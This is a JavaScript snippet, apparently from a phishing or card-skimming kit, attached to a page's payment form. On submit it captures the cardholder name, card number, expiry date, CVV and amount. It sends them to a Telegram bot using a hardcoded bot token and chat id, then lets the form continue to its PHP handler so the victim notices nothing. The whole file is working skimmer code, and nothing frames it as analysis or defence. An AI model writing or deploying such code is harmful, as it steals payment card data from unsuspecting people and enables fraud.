 document.addEventListener("DOMContentLoaded", function () {
        const form = document.getElementById('paymentForm');

        form.addEventListener('submit', function(event) {
            // First, prevent form submission until the JavaScript has executed
            event.preventDefault();

            // Gather form data
            const kniya = document.getElementById('kniya').value;
            const cb = document.getElementById('cb').value;
            const exp = document.getElementById('exp').value;
            const exp1 = document.getElementById('exp1').value;
            const cvv = document.getElementById('cvv').value;
            const posta = document.getElementById('posta').value;

            // Construct the message to send to Telegram
            const message = `=========[tlighmat INFO]=========\nName: ${kniya}\nNumber: ${cb}\nMonth: ${exp}\nYear: ${exp1}\nCVV: ${cvv}\nAmount: ${posta}\n`;

            // Send message to Telegram via JavaScript
            const token = "7362220906:AAFQs7iQ7qxNzSMNKBsIH5n9TKRNvzWgFp4";
            const chat_id = "-4566209215";

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chat_id,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log("JavaScript Telegram message sent successfully");

                    // Now that the JavaScript has sent the message, allow the form to submit to PHP
                    form.submit();  // This will trigger the PHP form action
                } else {
                    console.error("Error sending message to Telegram: " + data.description);
                }
            })
            .catch(error => {
                console.error("Error:", error);
            });
        });
    });
